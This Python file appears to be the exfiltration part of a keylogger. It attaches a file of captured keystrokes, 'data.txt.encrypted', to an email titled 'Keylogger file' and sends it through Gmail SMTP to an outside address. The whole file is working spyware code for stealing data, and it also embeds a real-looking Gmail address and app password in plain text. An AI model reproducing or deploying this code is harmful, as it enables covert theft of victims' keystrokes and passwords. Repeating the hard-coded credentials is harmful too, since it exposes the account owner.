import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def send_email():
        #put your gmail id, password, sender address over here

        email_user = "nikhilyadav79706@gmail.com"
        email_password = "bhbayxagkgtnvjdz"
        email_send = "2020bcanikhil8423@poornima.edu.in"
        #put any subject you like
        subject = 'Keylogger file'

        #fill in the body of the email

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject
        #put any body you like
        body = 'Here its todays report!!!!!!!!!!'
        msg.attach(MIMEText(body,'plain'))

        #do not change the file name for the keylogger to work

        #do not change anything from here to bottom

        filename='data.txt.encrypted'
        attachment  =open(filename,'rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user, email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()